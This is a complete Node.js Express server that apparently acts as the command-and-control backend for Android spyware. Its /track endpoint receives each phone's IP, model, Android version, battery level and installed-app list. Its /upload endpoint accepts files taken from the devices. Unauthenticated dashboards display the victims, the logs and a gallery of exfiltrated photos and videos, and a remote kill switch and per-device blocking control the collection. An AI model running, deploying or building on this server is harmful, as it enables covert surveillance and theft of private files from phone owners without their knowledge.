const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

/* ================= CONFIG ================= */

const LOG_FILE = "logs.json";
const UPLOAD_DIR = path.join(__dirname, "uploads");
const CONFIG_FILE = "config.json";

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function loadConfig() {
  try {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
  } catch {
    return { enabled: false };
  }
}

function isAllowed(req, type) {
  const cfg = loadConfig();
  const ip = getIP(req);
  const model = req.query.model || "";

  if (!cfg.enabled) return false;
  if (type === "track" && !cfg.send_device_info) return false;
  if (type === "upload" && !cfg.send_files) return false;
  if (cfg.blocked_ips?.includes(ip)) return false;
  if (cfg.blocked_models?.includes(model)) return false;

  return true;
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function parseBody(body) {
  const obj = {};
  body.split("&").forEach(pair => {
    const [key, value] = pair.split("=");
    if (key && value) obj[key] = decodeURIComponent(value);
  });
  return obj;
}

/* ================= CONFIG CONTROL ================= */

app.get('/config', (req, res) => {
  const cfg = loadConfig();
  res.send(cfg.enabled ? "1" : "0");
});

/* ================= TRACK ================= */

app.post('/track', (req, res) => {

  if (!isAllowed(req, "track")) {
    return res.json({ status: "blocked" });
  }

  let body = "";

  req.on('data', chunk => body += chunk.toString());

  req.on('end', () => {

    const parsed = parseBody(body);

    const allApps = parsed.apps
      ? parsed.apps.split(",").map(x => x.trim()).filter(Boolean)
      : [];

    const systemApps = allApps.filter(a =>
      a.startsWith("android") ||
      a.startsWith("com.android") ||
      a.startsWith("com.google")
    );

    const userApps = allApps.filter(a => !systemApps.includes(a));

    const data = {
      type: "device",
      ip: getIP(req),
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      app_count: allApps.length,
      system_apps: systemApps,
      user_apps: userApps,
      time: new Date().toISOString()
    };

    // 🔥 Advanced Console Log (clean)
    console.log("\n📱 DEVICE =====================");
    console.log(`IP: ${data.ip} | ${data.brand} ${data.model} | Android ${data.android}`);
    console.log(`Battery: ${data.battery}% | Apps: ${data.app_count} (User: ${userApps.length}, System: ${systemApps.length})`);
    console.log("======================================");

    saveLog(data);

    res.json({ status: "ok" });
  });
});

/* ================= UPLOAD ================= */

app.post('/upload', (req, res) => {

  if (!isAllowed(req, "upload")) {
    return res.status(403).send("blocked");
  }

  let fileName = Date.now().toString();
  let original = "file.bin";

  if (req.query.name) {
    try {
      const decoded = decodeURIComponent(req.query.name);
      original = path.basename(decoded);
    } catch {}
  }

  const ext = path.extname(original);
  fileName += ext || ".bin";

  const filePath = path.join(UPLOAD_DIR, fileName);

  // 🔥 Clean log
  console.log("\n📦 FILE RECEIVED =====================");
  console.log(`Saved as: ${fileName}`);
  console.log("======================================");

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  stream.on('error', () => console.log("Write error"));

  req.on('end', () => {

    saveLog({
      type: "file",
      file: fileName,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", file: fileName });
  });

  req.on('error', () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {

  if (!fs.existsSync(LOG_FILE)) return res.send("No data");

  const logs = fs.readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(x => JSON.parse(x));

  const devices = logs.filter(x => x.type === "device");

  const unique = {};

  devices.forEach(log => {
    if (!log.ip || !log.model) return;
    const key = log.ip + "_" + log.model;
    unique[key] = log;
  });

  const list = Object.values(unique);

  let html = `
  <html>
  <head>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; }
      .card { border:1px solid #333; padding:15px; margin:10px; border-radius:10px; }
      .apps { max-height:200px; overflow:auto; background:#000; padding:10px; margin-top:5px; }
      .apps div { font-size:12px; border-bottom:1px solid #222; padding:2px; }
      .title { margin-top:10px; font-weight:bold; }
    </style>
  </head>
  <body>
    <h2>Total Devices: ${list.length}</h2>
  `;

  list.reverse().forEach(user => {

    html += `
    <div class="card">
      <b>IP:</b> ${user.ip}<br>
      <b>Device:</b> ${user.brand} ${user.model}<br>
      <b>Android:</b> ${user.android}<br>
      <b>Battery:</b> ${user.battery}<br>
      <b>Total Apps:</b> ${user.app_count}<br>

      <div class="title">📱 User Apps (${user.user_apps?.length || 0})</div>
      <div class="apps">
        ${(user.user_apps || []).map(a => `<div>${a}</div>`).join("")}
      </div>

      <div class="title">⚙️ System Apps (${user.system_apps?.length || 0})</div>
      <div class="apps">
        ${(user.system_apps || []).map(a => `<div>${a}</div>`).join("")}
      </div>
    </div>
    `;
  });

  html += "</body></html>";

  res.send(html);
});

/* ================= LOGS ================= */

app.get('/logs', (req, res) => {

  if (!fs.existsSync(LOG_FILE)) return res.send("No logs");

  const logs = fs.readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(x => JSON.parse(x));

  const ordered = [
    ...logs.filter(x => x.type === "device"),
    ...logs.filter(x => x.type === "file")
  ];

  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;

  ordered.reverse().forEach(l => {
    html += `<pre>${JSON.stringify(l, null, 2)}</pre><hr>`;
  });

  html += "</body></html>";

  res.send(html);
});

/* ================= GALLERY ================= */

app.get('/gallery', (req, res) => {

  const files = fs.readdirSync(UPLOAD_DIR);

  let html = `
  <html>
  <head>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; }
      .grid { display:flex; flex-wrap:wrap; }
      .card { margin:10px; width:220px; }
      img, video { width:100%; border-radius:10px; background:#222; }
      img { filter: blur(10px); transition: filter 0.4s; }
      img.loaded { filter: blur(0); }
      .name { font-size:12px; margin-top:5px; word-break:break-all; }
    </style>
  </head>
  <body>
    <h2>Total Files: ${files.length}</h2>
    <div class="grid">
  `;

  files.reverse().forEach(file => {

    const url = `/uploads/${file}`;

    if (file.endsWith(".jpg") || file.endsWith(".png")) {
      html += `
        <div class="card">
          <img src="${url}" loading="lazy" onload="this.classList.add('loaded')" />
          <div class="name">${file}</div>
        </div>
      `;
    } else if (file.endsWith(".mp4")) {
      html += `
        <div class="card">
          <video controls preload="metadata">
            <source src="${url}" type="video/mp4">
          </video>
          <div class="name">${file}</div>
        </div>
      `;
    } else {
      html += `
        <div class="card">
          <a href="${url}" target="_blank">${file}</a>
        </div>
      `;
    }

  });

  html += `</div></body></html>`;

  res.send(html);
});

/* ================= STATIC ================= */

app.use('/uploads', express.static(UPLOAD_DIR));

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
